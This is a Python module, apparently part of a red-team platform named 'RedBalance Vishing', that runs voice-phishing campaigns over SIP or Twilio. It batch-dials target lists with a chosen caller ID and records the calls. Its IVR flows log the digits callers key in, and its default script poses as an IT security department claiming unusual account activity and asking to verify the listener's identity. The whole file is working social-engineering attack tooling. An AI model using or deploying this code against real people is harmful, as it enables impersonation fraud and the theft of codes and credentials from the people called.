"""
VoIP / SIP Engine for RedBalance Vishing
Provides SIP registration, call origination, DTMF handling, and call control.
Falls back to Twilio when SIP is not configured.
"""

import json
import os
import threading
import time
import uuid
import wave
import struct
from dataclasses import dataclass, field
from enum import Enum
from typing import Callable, Optional


# ──────────────────────────────────────────────────────────────────────────────
# Data models
# ──────────────────────────────────────────────────────────────────────────────

class CallStatus(Enum):
    IDLE = "idle"
    REGISTERING = "registering"
    REGISTERED = "registered"
    DIALING = "dialing"
    RINGING = "ringing"
    ANSWERED = "answered"
    IN_PROGRESS = "in-progress"
    ON_HOLD = "on-hold"
    TRANSFERRING = "transferring"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


@dataclass
class SIPConfig:
    server: str = ""
    port: int = 5060
    username: str = ""
    password: str = ""
    transport: str = "UDP"  # UDP, TCP, TLS
    caller_id: str = ""
    proxy: str = ""
    codecs: list = field(default_factory=lambda: ["PCMU", "PCMA", "G729"])
    enabled: bool = False


@dataclass
class CallRecord:
    call_id: str = ""
    target_phone: str = ""
    target_name: str = ""
    caller_id: str = ""
    status: str = "idle"
    dtmf_digits: str = ""       # Collected DTMF input
    dtmf_log: list = field(default_factory=list)  # [{digit, timestamp}]
    duration: float = 0.0
    started_at: str = ""
    ended_at: str = ""
    recording_path: str = ""
    transcription: str = ""
    outcome: str = ""
    notes: str = ""
    method: str = "sip"         # "sip", "twilio", "manual"
    twilio_sid: str = ""
    ivr_state: str = "root"     # Current IVR menu state
    ivr_data: dict = field(default_factory=dict)  # Collected IVR data
    amd_result: str = ""        # "human", "machine", "unknown"


@dataclass
class IVRNode:
    """Single node in an IVR flow tree."""
    node_id: str = ""
    prompt_text: str = ""       # Text to speak/play
    prompt_audio: str = ""      # Audio file URL to play
    gather_type: str = "dtmf"   # "dtmf", "speech", "both"
    num_digits: int = 0         # 0 = any length, >0 = exact digits
    timeout: int = 5
    actions: dict = field(default_factory=dict)  # {digit: {action, target, ...}}
    # action types: "goto" (another node), "collect" (store input), "transfer", "hangup", "play"
    default_action: str = "repeat"  # What to do on invalid input


# ──────────────────────────────────────────────────────────────────────────────
# SIP Client (pyVoIP-based, with graceful fallback)
# ──────────────────────────────────────────────────────────────────────────────

_sip_config = SIPConfig()
_active_calls: dict[str, CallRecord] = {}
_call_event_handlers: list[Callable] = []
_ivr_flows: dict[str, dict[str, IVRNode]] = {}  # {flow_id: {node_id: IVRNode}}


def configure_sip(config: dict):
    """Update SIP configuration."""
    global _sip_config
    _sip_config.server = config.get("server", "").strip()
    _sip_config.port = int(config.get("port", 5060))
    _sip_config.username = config.get("username", "").strip()
    _sip_config.password = config.get("password", "").strip()
    _sip_config.transport = config.get("transport", "UDP").upper()
    _sip_config.caller_id = config.get("caller_id", "").strip()
    _sip_config.proxy = config.get("proxy", "").strip()
    _sip_config.enabled = bool(_sip_config.server and _sip_config.username)
    return {"ok": True, "enabled": _sip_config.enabled}


def get_sip_status() -> dict:
    """Return SIP registration status."""
    return {
        "configured": _sip_config.enabled,
        "server": _sip_config.server,
        "port": _sip_config.port,
        "username": _sip_config.username,
        "transport": _sip_config.transport,
        "caller_id": _sip_config.caller_id,
    }


def on_call_event(handler: Callable):
    """Register a callback for call events (status changes, DTMF, etc.)."""
    _call_event_handlers.append(handler)


def _emit_event(call_id: str, event_type: str, data: dict = None):
    """Emit a call event to all registered handlers."""
    event = {"call_id": call_id, "type": event_type, "data": data or {}, "timestamp": time.time()}
    for handler in _call_event_handlers:
        try:
            handler(event)
        except Exception:
            pass


# ──────────────────────────────────────────────────────────────────────────────
# Call origination
# ──────────────────────────────────────────────────────────────────────────────

def originate_call(
    target_phone: str,
    caller_id: str = "",
    audio_url: str = "",
    ivr_flow_id: str = "",
    campaign_id: str = "",
    target_name: str = "",
    method: str = "auto",  # "auto", "sip", "twilio", "manual"
) -> CallRecord:
    """
    Originate a call using the best available method.
    Priority: SIP → Twilio → Manual
    """
    call_id = uuid.uuid4().hex[:8]
    record = CallRecord(
        call_id=call_id,
        target_phone=target_phone,
        target_name=target_name,
        caller_id=caller_id or _sip_config.caller_id,
        started_at=time.strftime("%Y-%m-%d %H:%M:%S"),
    )
    _active_calls[call_id] = record

    # Determine method
    if method == "auto":
        if _sip_config.enabled:
            method = "sip"
        elif os.environ.get("TWILIO_ACCOUNT_SID") and os.environ.get("TWILIO_AUTH_TOKEN"):
            method = "twilio"
        else:
            method = "manual"

    record.method = method

    if method == "sip":
        _originate_sip(record, audio_url, ivr_flow_id)
    elif method == "twilio":
        _originate_twilio(record, audio_url, ivr_flow_id, campaign_id)
    else:
        record.status = "manual"
        _emit_event(call_id, "status", {"status": "manual"})

    return record


def _originate_twilio(record: CallRecord, audio_url: str, ivr_flow_id: str, campaign_id: str):
    """Originate call via Twilio with enhanced TwiML."""
    try:
        from twilio.rest import Client
    except ImportError:
        record.status = "failed"
        record.notes = "twilio package not installed"
        _emit_event(record.call_id, "error", {"msg": "pip install twilio"})
        return

    sid = os.environ.get("TWILIO_ACCOUNT_SID", "")
    token = os.environ.get("TWILIO_AUTH_TOKEN", "")
    if not sid or not token:
        record.status = "failed"
        record.notes = "Twilio credentials not configured"
        _emit_event(record.call_id, "error", {"msg": "No Twilio credentials"})
        return

    client = Client(sid, token)
    record.status = "dialing"
    _emit_event(record.call_id, "status", {"status": "dialing"})

    # Build TwiML
    twiml = _build_twiml(audio_url, ivr_flow_id, record.call_id, campaign_id)

    try:
        # Determine callback URL
        base_url = os.environ.get("VISHING_CALLBACK_URL", "")
        status_callback = f"{base_url}/api/vishing/twilio-callback/{record.call_id}" if base_url else None

        call_params = {
            "to": record.target_phone,
            "from_": record.caller_id or os.environ.get("TWILIO_CALLER_ID", ""),
            "twiml": twiml,
            "record": True,
            "machine_detection": "DetectMessageEnd",
        }
        if status_callback:
            call_params["status_callback"] = status_callback
            call_params["status_callback_event"] = ["initiated", "ringing", "answered", "completed"]

        call = client.calls.create(**call_params)
        record.twilio_sid = call.sid
        record.status = call.status or "queued"
        _emit_event(record.call_id, "status", {"status": record.status, "twilio_sid": call.sid})
    except Exception as e:
        record.status = "failed"
        record.notes = str(e)
        _emit_event(record.call_id, "error", {"msg": str(e)})


def _originate_sip(record: CallRecord, audio_url: str, ivr_flow_id: str):
    """Originate call via SIP trunk using pyVoIP."""
    record.status = "dialing"
    _emit_event(record.call_id, "status", {"status": "dialing"})

    try:
        from pyVoIP.VoIP import VoIPPhone, CallState
        from pyVoIP.SIP import SIPClient as PySIPClient

        phone = VoIPPhone(
            _sip_config.server,
            _sip_config.port,
            _sip_config.username,
            _sip_config.password,
            callCallback=lambda call: _sip_call_handler(call, record, audio_url, ivr_flow_id),
            transport=_sip_config.transport,
        )
        phone.start()

        # Originate the call
        call = phone.call(record.target_phone)
        record.status = "ringing"
        _emit_event(record.call_id, "status", {"status": "ringing"})

    except ImportError:
        record.status = "failed"
        record.notes = "pyVoIP not installed — pip install pyVoIP"
        _emit_event(record.call_id, "error", {"msg": "pip install pyVoIP"})
    except Exception as e:
        record.status = "failed"
        record.notes = str(e)
        _emit_event(record.call_id, "error", {"msg": str(e)})


def _sip_call_handler(call, record: CallRecord, audio_url: str, ivr_flow_id: str):
    """Handle SIP call state changes and DTMF events."""
    try:
        from pyVoIP.VoIP import CallState
    except ImportError:
        return

    while call.state != CallState.ENDED:
        if call.state == CallState.RINGING:
            record.status = "ringing"
            _emit_event(record.call_id, "status", {"status": "ringing"})
        elif call.state == CallState.ANSWERED:
            record.status = "answered"
            _emit_event(record.call_id, "status", {"status": "answered"})

            # Play audio if available
            if audio_url and os.path.isfile(audio_url):
                _play_audio_to_call(call, audio_url)

            # Handle DTMF if IVR flow is configured
            if ivr_flow_id:
                _handle_sip_ivr(call, record, ivr_flow_id)
            else:
                # Just record/listen
                _record_sip_call(call, record)

        time.sleep(0.1)

    record.status = "completed"
    record.ended_at = time.strftime("%Y-%m-%d %H:%M:%S")
    if record.started_at:
        try:
            start = time.mktime(time.strptime(record.started_at, "%Y-%m-%d %H:%M:%S"))
            end = time.mktime(time.strptime(record.ended_at, "%Y-%m-%d %H:%M:%S"))
            record.duration = end - start
        except Exception:
            pass
    _emit_event(record.call_id, "status", {"status": "completed", "duration": record.duration})


def _play_audio_to_call(call, audio_path: str):
    """Stream audio file to SIP call."""
    try:
        with wave.open(audio_path, 'rb') as wav:
            frames = wav.readframes(wav.getnframes())
            # Convert to 8kHz PCMU if needed
            call.write_audio(frames)
    except Exception:
        pass


def _record_sip_call(call, record: CallRecord):
    """Record incoming audio from SIP call."""
    recording_dir = os.path.join(os.path.dirname(__file__), "static", "recordings")
    os.makedirs(recording_dir, exist_ok=True)
    recording_path = os.path.join(recording_dir, f"{record.call_id}.wav")

    try:
        from pyVoIP.VoIP import CallState
        frames = []
        while call.state == CallState.ANSWERED:
            audio = call.read_audio(160)  # 20ms of 8kHz audio
            if audio:
                frames.append(audio)
            time.sleep(0.02)

        # Save recording
        if frames:
            with wave.open(recording_path, 'wb') as wav:
                wav.setnchannels(1)
                wav.setsampwidth(2)
                wav.setframerate(8000)
                wav.writeframes(b''.join(frames))
            record.recording_path = f"/static/recordings/{record.call_id}.wav"
    except Exception:
        pass


# ──────────────────────────────────────────────────────────────────────────────
# TwiML Builder (for Twilio calls with IVR support)
# ──────────────────────────────────────────────────────────────────────────────

def _build_twiml(audio_url: str, ivr_flow_id: str, call_id: str, campaign_id: str) -> str:
    """Build TwiML for Twilio call with IVR, DTMF gathering, etc."""
    base_url = os.environ.get("VISHING_CALLBACK_URL", "")

    if ivr_flow_id and ivr_flow_id in _ivr_flows:
        # IVR mode — start with root node
        flow = _ivr_flows[ivr_flow_id]
        root = flow.get("root")
        if root:
            return _build_ivr_twiml(root, call_id, campaign_id, ivr_flow_id, base_url)

    # Simple mode — play audio or say message
    if audio_url:
        abs_audio = audio_url
        if not audio_url.startswith("http"):
            abs_audio = f"{base_url}{audio_url}" if base_url else audio_url
        return f'<Response><Play>{abs_audio}</Play><Pause length="30"/></Response>'

    # Default IT support message
    return (
        '<Response>'
        '<Say voice="Polly.Matthew" language="en-US">'
        'Hello, this is the IT security department. '
        'We detected unusual activity on your account. '
        'Please hold while we verify your identity.'
        '</Say>'
        '<Pause length="60"/>'
        '</Response>'
    )


def _build_ivr_twiml(node: IVRNode, call_id: str, campaign_id: str, flow_id: str, base_url: str) -> str:
    """Build TwiML for a single IVR node with Gather."""
    action_url = f"{base_url}/api/vishing/ivr/response" if base_url else "/api/vishing/ivr/response"
    action_url += f"?call_id={call_id}&campaign_id={campaign_id}&flow_id={flow_id}&node_id={node.node_id}"

    twiml = '<Response>'

    if node.prompt_audio:
        prompt = f'<Play>{node.prompt_audio}</Play>'
    elif node.prompt_text:
        prompt = f'<Say voice="Polly.Matthew" language="en-US">{node.prompt_text}</Say>'
    else:
        prompt = ''

    # Wrap in Gather for DTMF/speech input
    gather_attrs = f'action="{action_url}" method="POST" input="{node.gather_type}" timeout="{node.timeout}"'
    if node.num_digits > 0:
        gather_attrs += f' numDigits="{node.num_digits}"'

    twiml += f'<Gather {gather_attrs}>{prompt}</Gather>'

    # Fallback if no input
    if node.default_action == "repeat":
        twiml += f'<Redirect>{action_url}&timeout=true</Redirect>'
    else:
        twiml += '<Say>Goodbye.</Say><Hangup/>'

    twiml += '</Response>'
    return twiml


# ──────────────────────────────────────────────────────────────────────────────
# IVR Flow Management
# ──────────────────────────────────────────────────────────────────────────────

def create_ivr_flow(flow_id: str, nodes: list[dict]) -> dict:
    """Create or update an IVR flow from a list of node definitions."""
    flow = {}
    for nd in nodes:
        node = IVRNode(
            node_id=nd.get("node_id", ""),
            prompt_text=nd.get("prompt_text", ""),
            prompt_audio=nd.get("prompt_audio", ""),
            gather_type=nd.get("gather_type", "dtmf"),
            num_digits=nd.get("num_digits", 0),
            timeout=nd.get("timeout", 5),
            actions=nd.get("actions", {}),
            default_action=nd.get("default_action", "repeat"),
        )
        flow[node.node_id] = node
    _ivr_flows[flow_id] = flow
    return {"ok": True, "flow_id": flow_id, "node_count": len(flow)}


def list_ivr_flows() -> list:
    """List all IVR flows."""
    return [
        {"flow_id": fid, "node_count": len(nodes), "nodes": list(nodes.keys())}
        for fid, nodes in _ivr_flows.items()
    ]


def get_ivr_flow(flow_id: str) -> dict:
    """Get an IVR flow with all nodes."""
    flow = _ivr_flows.get(flow_id, {})
    return {
        "flow_id": flow_id,
        "nodes": {
            nid: {
                "node_id": n.node_id,
                "prompt_text": n.prompt_text,
                "prompt_audio": n.prompt_audio,
                "gather_type": n.gather_type,
                "num_digits": n.num_digits,
                "timeout": n.timeout,
                "actions": n.actions,
                "default_action": n.default_action,
            }
            for nid, n in flow.items()
        },
    }


def process_ivr_input(call_id: str, flow_id: str, node_id: str, digits: str, speech: str = "") -> str:
    """
    Process DTMF/speech input from an IVR node and return TwiML for the next step.
    Called by the Twilio webhook or SIP DTMF handler.
    """
    record = _active_calls.get(call_id)
    flow = _ivr_flows.get(flow_id, {})
    node = flow.get(node_id)

    if not node:
        return '<Response><Say>An error occurred. Goodbye.</Say><Hangup/></Response>'

    # Log the DTMF input
    if record:
        record.dtmf_digits += digits
        record.dtmf_log.append({"digit": digits, "node": node_id, "timestamp": time.time()})
        _emit_event(call_id, "dtmf", {"digits": digits, "node": node_id})

    # Find matching action
    action = node.actions.get(digits) or node.actions.get("*")  # * = wildcard

    if not action:
        # No match — repeat or hangup
        if node.default_action == "repeat":
            base_url = os.environ.get("VISHING_CALLBACK_URL", "")
            return _build_ivr_twiml(node, call_id, "", flow_id, base_url)
        return '<Response><Say>Invalid input. Goodbye.</Say><Hangup/></Response>'

    action_type = action.get("action", "hangup")

    if action_type == "goto":
        # Navigate to another IVR node
        next_node = flow.get(action.get("target", ""))
        if next_node:
            base_url = os.environ.get("VISHING_CALLBACK_URL", "")
            return _build_ivr_twiml(next_node, call_id, "", flow_id, base_url)

    elif action_type == "collect":
        # Store the collected data
        field_name = action.get("field", "input")
        if record:
            record.ivr_data[field_name] = digits
            _emit_event(call_id, "ivr_collect", {"field": field_name, "value": digits})
        # Continue to next node if specified
        next_id = action.get("then", "")
        next_node = flow.get(next_id)
        if next_node:
            base_url = os.environ.get("VISHING_CALLBACK_URL", "")
            return _build_ivr_twiml(next_node, call_id, "", flow_id, base_url)
        return '<Response><Say>Thank you. Goodbye.</Say><Hangup/></Response>'

    elif action_type == "transfer":
        target = action.get("target", "")
        return f'<Response><Say>Transferring you now.</Say><Dial>{target}</Dial></Response>'

    elif action_type == "play":
        url = action.get("url", "")
        return f'<Response><Play>{url}</Play><Pause length="5"/><Hangup/></Response>'

    elif action_type == "conference":
        room = action.get("room", f"vishing-{call_id}")
        return f'<Response><Dial><Conference>{room}</Conference></Dial></Response>'

    # Default: hangup
    msg = action.get("message", "Thank you for your time. Goodbye.")
    return f'<Response><Say>{msg}</Say><Hangup/></Response>'


# ──────────────────────────────────────────────────────────────────────────────
# Call control (for active calls)
# ──────────────────────────────────────────────────────────────────────────────

def get_active_calls() -> list:
    """List all active/recent calls."""
    return [
        {
            "call_id": r.call_id,
            "target_phone": r.target_phone,
            "target_name": r.target_name,
            "status": r.status,
            "method": r.method,
            "duration": r.duration,
            "dtmf_digits": r.dtmf_digits,
            "ivr_data": r.ivr_data,
            "amd_result": r.amd_result,
            "started_at": r.started_at,
        }
        for r in _active_calls.values()
    ]


def get_call(call_id: str) -> Optional[CallRecord]:
    """Get a specific call record."""
    return _active_calls.get(call_id)


def hangup_call(call_id: str) -> dict:
    """Hang up an active call."""
    record = _active_calls.get(call_id)
    if not record:
        return {"error": "Call not found"}

    if record.method == "twilio" and record.twilio_sid:
        try:
            from twilio.rest import Client
            client = Client(
                os.environ.get("TWILIO_ACCOUNT_SID"),
                os.environ.get("TWILIO_AUTH_TOKEN"),
            )
            client.calls(record.twilio_sid).update(status="completed")
        except Exception as e:
            return {"error": str(e)}

    record.status = "completed"
    record.ended_at = time.strftime("%Y-%m-%d %H:%M:%S")
    _emit_event(call_id, "status", {"status": "completed"})
    return {"ok": True}


def hold_call(call_id: str) -> dict:
    """Put an active Twilio call on hold."""
    record = _active_calls.get(call_id)
    if not record or record.method != "twilio":
        return {"error": "Can only hold Twilio calls"}

    try:
        from twilio.rest import Client
        client = Client(
            os.environ.get("TWILIO_ACCOUNT_SID"),
            os.environ.get("TWILIO_AUTH_TOKEN"),
        )
        hold_twiml = '<Response><Say>Please hold.</Say><Play loop="0">http://com.twilio.music.classical.s3.amazonaws.com/BusssyBusworthy-702702__hold-music.mp3</Play></Response>'
        client.calls(record.twilio_sid).update(twiml=hold_twiml)
        record.status = "on-hold"
        _emit_event(call_id, "status", {"status": "on-hold"})
        return {"ok": True}
    except Exception as e:
        return {"error": str(e)}


def resume_call(call_id: str, audio_url: str = "") -> dict:
    """Resume a held Twilio call."""
    record = _active_calls.get(call_id)
    if not record or record.method != "twilio":
        return {"error": "Can only resume Twilio calls"}

    try:
        from twilio.rest import Client
        client = Client(
            os.environ.get("TWILIO_ACCOUNT_SID"),
            os.environ.get("TWILIO_AUTH_TOKEN"),
        )
        if audio_url:
            twiml = f'<Response><Play>{audio_url}</Play><Pause length="60"/></Response>'
        else:
            twiml = '<Response><Pause length="120"/></Response>'
        client.calls(record.twilio_sid).update(twiml=twiml)
        record.status = "in-progress"
        _emit_event(call_id, "status", {"status": "in-progress"})
        return {"ok": True}
    except Exception as e:
        return {"error": str(e)}


def transfer_call(call_id: str, target_number: str) -> dict:
    """Transfer an active Twilio call to another number."""
    record = _active_calls.get(call_id)
    if not record or record.method != "twilio":
        return {"error": "Can only transfer Twilio calls"}

    try:
        from twilio.rest import Client
        client = Client(
            os.environ.get("TWILIO_ACCOUNT_SID"),
            os.environ.get("TWILIO_AUTH_TOKEN"),
        )
        twiml = f'<Response><Say>Transferring you now.</Say><Dial>{target_number}</Dial></Response>'
        client.calls(record.twilio_sid).update(twiml=twiml)
        record.status = "transferring"
        _emit_event(call_id, "status", {"status": "transferring", "transfer_to": target_number})
        return {"ok": True}
    except Exception as e:
        return {"error": str(e)}


def send_dtmf(call_id: str, digits: str) -> dict:
    """Send DTMF tones to an active Twilio call."""
    record = _active_calls.get(call_id)
    if not record or record.method != "twilio":
        return {"error": "Can only send DTMF on Twilio calls"}

    try:
        from twilio.rest import Client
        client = Client(
            os.environ.get("TWILIO_ACCOUNT_SID"),
            os.environ.get("TWILIO_AUTH_TOKEN"),
        )
        # Use TwiML Play with DTMF tones
        twiml_digits = ''.join(f'<Play digits="{d}"/>' for d in digits)
        twiml = f'<Response>{twiml_digits}<Pause length="60"/></Response>'
        client.calls(record.twilio_sid).update(twiml=twiml)
        return {"ok": True}
    except Exception as e:
        return {"error": str(e)}


def conference_call(call_id: str, room_name: str = "") -> dict:
    """Move an active Twilio call into a conference for live monitoring."""
    record = _active_calls.get(call_id)
    if not record or record.method != "twilio":
        return {"error": "Can only conference Twilio calls"}

    room = room_name or f"vishing-{call_id}"
    try:
        from twilio.rest import Client
        client = Client(
            os.environ.get("TWILIO_ACCOUNT_SID"),
            os.environ.get("TWILIO_AUTH_TOKEN"),
        )
        twiml = f'<Response><Dial><Conference startConferenceOnEnter="true" endConferenceOnExit="false">{room}</Conference></Dial></Response>'
        client.calls(record.twilio_sid).update(twiml=twiml)
        record.status = "in-progress"
        _emit_event(call_id, "status", {"status": "in-progress", "conference": room})
        return {"ok": True, "room": room}
    except Exception as e:
        return {"error": str(e)}


# ──────────────────────────────────────────────────────────────────────────────
# Batch calling
# ──────────────────────────────────────────────────────────────────────────────

_batch_jobs: dict = {}


def start_batch_calls(
    targets: list[dict],  # [{phone, name, context}]
    campaign_id: str = "",
    caller_id: str = "",
    audio_url: str = "",
    ivr_flow_id: str = "",
    delay_seconds: int = 30,
    method: str = "auto",
) -> dict:
    """Start batch calling a list of targets with configurable delay."""
    batch_id = uuid.uuid4().hex[:8]
    job = {
        "batch_id": batch_id,
        "campaign_id": campaign_id,
        "targets": targets,
        "delay": delay_seconds,
        "status": "running",
        "completed": 0,
        "total": len(targets),
        "calls": [],
        "cancel": threading.Event(),
    }
    _batch_jobs[batch_id] = job

    def _run_batch():
        for i, target in enumerate(targets):
            if job["cancel"].is_set():
                job["status"] = "cancelled"
                break
            record = originate_call(
                target_phone=target["phone"],
                caller_id=caller_id,
                audio_url=audio_url,
                ivr_flow_id=ivr_flow_id,
                campaign_id=campaign_id,
                target_name=target.get("name", ""),
                method=method,
            )
            job["calls"].append(record.call_id)
            job["completed"] = i + 1
            _emit_event(batch_id, "batch_progress", {"completed": i + 1, "total": len(targets)})

            # Wait between calls
            if i < len(targets) - 1:
                for _ in range(delay_seconds):
                    if job["cancel"].is_set():
                        break
                    time.sleep(1)

        if job["status"] != "cancelled":
            job["status"] = "done"
        _emit_event(batch_id, "batch_done", {"status": job["status"]})

    thread = threading.Thread(target=_run_batch, daemon=True)
    thread.start()

    return {"batch_id": batch_id, "total": len(targets), "delay": delay_seconds}


def stop_batch(batch_id: str) -> dict:
    """Cancel a running batch job."""
    job = _batch_jobs.get(batch_id)
    if not job:
        return {"error": "Batch not found"}
    job["cancel"].set()
    return {"ok": True}


def get_batch_status(batch_id: str) -> dict:
    """Get batch calling progress."""
    job = _batch_jobs.get(batch_id)
    if not job:
        return {"error": "Batch not found"}
    return {
        "batch_id": batch_id,
        "status": job["status"],
        "completed": job["completed"],
        "total": job["total"],
        "calls": job["calls"],
    }


# ──────────────────────────────────────────────────────────────────────────────
# Twilio callback handling
# ──────────────────────────────────────────────────────────────────────────────

def handle_twilio_callback(call_id: str, form_data: dict) -> None:
    """Process Twilio status callback."""
    record = _active_calls.get(call_id)
    if not record:
        return

    status = form_data.get("CallStatus", "")
    if status:
        record.status = status
        _emit_event(call_id, "status", {"status": status})

    # Recording URL
    recording = form_data.get("RecordingUrl", "")
    if recording:
        record.recording_path = recording
        _emit_event(call_id, "recording", {"url": recording})

    # AMD result
    amd = form_data.get("AnsweredBy", "")
    if amd:
        record.amd_result = amd
        _emit_event(call_id, "amd", {"result": amd})

    # Call duration
    duration = form_data.get("CallDuration", "")
    if duration:
        record.duration = float(duration)

    # Completed
    if status in ("completed", "failed", "busy", "no-answer", "canceled"):
        record.ended_at = time.strftime("%Y-%m-%d %H:%M:%S")


def _handle_sip_ivr(call, record: CallRecord, ivr_flow_id: str):
    """Handle IVR interaction over SIP (DTMF collection)."""
    flow = _ivr_flows.get(ivr_flow_id, {})
    current_node = flow.get("root")
    if not current_node:
        return

    try:
        from pyVoIP.VoIP import CallState
    except ImportError:
        return

    while call.state == CallState.ANSWERED and current_node:
        # Play prompt
        if current_node.prompt_audio and os.path.isfile(current_node.prompt_audio):
            _play_audio_to_call(call, current_node.prompt_audio)

        # Wait for DTMF
        digits = ""
        deadline = time.time() + current_node.timeout
        while time.time() < deadline and call.state == CallState.ANSWERED:
            dtmf = call.get_dtmf()
            if dtmf:
                digits += dtmf
                record.dtmf_digits += dtmf
                record.dtmf_log.append({"digit": dtmf, "node": current_node.node_id, "timestamp": time.time()})
                _emit_event(record.call_id, "dtmf", {"digits": dtmf, "node": current_node.node_id})
                if current_node.num_digits > 0 and len(digits) >= current_node.num_digits:
                    break
            time.sleep(0.05)

        # Process input
        action = current_node.actions.get(digits) or current_node.actions.get("*")
        if action:
            action_type = action.get("action", "hangup")
            if action_type == "goto":
                current_node = flow.get(action.get("target", ""))
            elif action_type == "collect":
                field_name = action.get("field", "input")
                record.ivr_data[field_name] = digits
                _emit_event(record.call_id, "ivr_collect", {"field": field_name, "value": digits})
                next_id = action.get("then", "")
                current_node = flow.get(next_id)
            else:
                break
        elif current_node.default_action != "repeat":
            break
